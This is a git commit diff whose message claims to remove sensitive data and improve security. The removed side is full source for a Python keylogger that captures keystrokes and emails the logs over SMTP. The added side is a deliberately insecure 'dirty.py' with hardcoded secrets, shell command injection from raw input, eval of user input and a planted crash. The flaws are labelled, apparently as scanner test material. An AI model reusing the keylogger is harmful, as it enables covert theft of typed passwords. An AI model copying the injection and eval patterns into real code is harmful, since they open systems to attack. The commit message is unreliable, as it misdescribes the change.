3f4ef46553a6266bcfa476c839dc890e66bd0dec
Krisha Arora <krisha.arora2006@gmail.com>
2026-03-25 13:25:50 +0530

    Remove sensitive data and unused code
    Refactor code to improve security and remove unused variables.

--- text001.py
+++ text001.py
@@ -1,141 +1,76 @@
+# dirty.py
+
 import os
+import sys
+import subprocess
 
-import keyboard # for keylogs
-import smtplib # for sending email using SMTP protocol (gmail)
-# Timer is to make a method runs after an `interval` amount of time
-from threading import Timer
-from datetime import datetime
-from email.mime.multipart import MIMEMultipart
-from email.mime.text import MIMEText
+# HARDCODED SECRET (security issue)
+API_KEY = "sk-1234567890-SECRET-KEY"
+PASSWORD = "admin123"
 
-SEND_REPORT_EVERY = 60 # in seconds, 60 means 1 minute and so on
-EMAIL_ADDRESS = "email@provider.tld"
-EMAIL_PASSWORD = "password_here"
+# TODO: remove debug prints before production
+print("Starting application...")
 
-class Keylogger:
-    def __init__(self, interval, report_method="email"):
-        # we gonna pass SEND_REPORT_EVERY to interval
-        self.interval = interval
-        self.report_method = report_method
-        # this is the string variable that contains the log of all 
-        # the keystrokes within `self.interval`
-        self.log = ""
-        # record start & end datetimes
-        self.start_dt = datetime.now()
-        self.end_dt = datetime.now()
+# UNUSED VARIABLE
+unused_var = 42
 
-    def callback(self, event):
-        """
-        This callback is invoked whenever a keyboard event is occured
-        (i.e when a key is released in this example)
-        """
-        name = event.name
-        if len(name) > 1:
-            # not a character, special key (e.g ctrl, alt, etc.)
-            # uppercase with []
-            if name == "space":
-                # " " instead of "space"
-                name = " "
-            elif name == "enter":
-                # add a new line whenever an ENTER is pressed
-                name = "[ENTER]\n"
-            elif name == "decimal":
-                name = "."
-            else:
-                # replace spaces with underscores
-                name = name.replace(" ", "_")
-                name = f"[{name.upper()}]"
-        # finally, add the key name to our global `self.log` variable
-        self.log += name
-    
-    def update_filename(self):
-        # construct the filename to be identified by start & end datetimes
-        start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
-        end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
-        self.filename = f"keylog-{start_dt_str}_{end_dt_str}"
+def run_command(cmd):
+    # SECURITY RISK: shell=True (command injection)
+    return subprocess.check_output(cmd, shell=True)
 
-    def report_to_file(self):
-        """This method creates a log file in the current directory that contains
-        the current keylogs in the `self.log` variable"""
-        # open the file in write mode (create it)
-        with open(f"{self.filename}.txt", "w") as f:
-            # write the keylogs to the file
-            print(self.log, file=f)
-        print(f"[+] Saved {self.filename}.txt")
+def insecure_eval(user_input):
+    # VERY BAD: arbitrary code execution
+    return eval(user_input)
 
-    def prepare_mail(self, message):
-        """Utility function to construct a MIMEMultipart from a text
-        It creates an HTML version as well as text version
-        to be sent as an email"""
-        msg = MIMEMultipart("alternative")
-        msg["From"] = EMAIL_ADDRESS
-        msg["To"] = EMAIL_ADDRESS
-        msg["Subject"] = "Keylogger logs"
-        # simple paragraph, feel free to edit
-        html = f"<p>{message}</p>"
-        text_part = MIMEText(message, "plain")
-        html_part = MIMEText(html, "html")
-        msg.attach(text_part)
-        msg.attach(html_part)
-        # after making the mail, convert back as string message
-        return msg.as_string()
+def read_file(filename):
+    # NO ERROR HANDLING
+    f = open(filename, "r")
+    data = f.read()
+    return data  # file not closed
 
-    def sendmail(self, email, password, message, verbose=1):
-        # manages a connection to an SMTP server
-        # in our case it's for Microsoft365, Outlook, Hotmail, and live.com
-        server = smtplib.SMTP(host="smtp.office365.com", port=587)
-        # connect to the SMTP server as TLS mode ( for security )
-        server.starttls()
-        # login to the email account
-        server.login(email, password)
-        # send the actual message after preparation
-        server.sendmail(email, email, self.prepare_mail(message))
-        # terminates the session
-        server.quit()
-        if verbose:
-            print(f"{datetime.now()} - Sent an email to {email} containing:  {message}")
+def write_file(filename, content):
+    # NO CONTEXT MANAGER
+    f = open(filename, "w")
+    f.write(content)
 
-    def report(self):
-        """
-        This function gets called every `self.interval`
-        It basically sends keylogs and resets `self.log` variable
-        """
-        if self.log:
-            # if there is something in log, report it
-            self.end_dt = datetime.now()
-            # update `self.filename`
-            self.update_filename()
-            if self.report_method == "email":
-                self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
-            elif self.report_method == "file":
-                self.report_to_file()
-                # if you don't want to print in the console, comment below line
-                print(f"[{self.filename}] - {self.log}")
-            self.start_dt = datetime.now()
-        self.log = ""
-        timer = Timer(interval=self.interval, function=self.report)
-        # set the thread as daemon (dies when main thread die)
-        timer.daemon = True
-        # start the timer
-        timer.start()
+def login(user, password):
+    # HARDCODED AUTH CHECK
+    if user == "admin" and password == PASSWORD:
+        return True
+    return False
 
-    def start(self):
-        # record the start datetime
-        self.start_dt = datetime.now()
-        # start the keylogger
-        keyboard.on_release(callback=self.callback)
-        # start reporting the keylogs
-        self.report()
-        # make a simple message
-        print(f"{datetime.now()} - Started keylogger")
-        # block the current thread, wait until CTRL+C is pressed
-        keyboard.wait()
+def process_data(data):
+    # BAD STYLE + NO VALIDATION
+    result = []
+    for i in range(len(data)):
+        result.append(data[i] * 2)
+    return result
 
-    
+# DEBUG CODE LEFT IN
 if __name__ == "__main__":
-    # if you want a keylogger to send to your email
-    # keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="email")
-    # if you want a keylogger to record keylogs to a local file 
-    # (and then send it using your favorite method)
-    keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="file")
-    keylogger.start()
+    user_input = input("Enter command: ")
+    
+    # POTENTIAL INJECTION
+    output = run_command(user_input)
+    print("Command output:", output)
+
+    # UNSAFE EVAL
+    expr = input("Enter expression: ")
+    print("Eval result:", insecure_eval(expr))
+
+    # FILE READ WITHOUT CHECK
+    content = read_file("sample.txt")
+    print("File content:", content)
+
+    # HARDCODED LOGIN TEST
+    if login("admin", "admin123"):
+        print("Logged in!")
+
+    # RANDOM CRASH POSSIBILITY
+    numbers = [1, 2, 3]
+    print(numbers[5])  # IndexError
+
+# FIXME: handle exceptions properly
+# FIXME: remove hardcoded credentials
+# FIXME: sanitize user input
+# FIXME: add logging instead of print
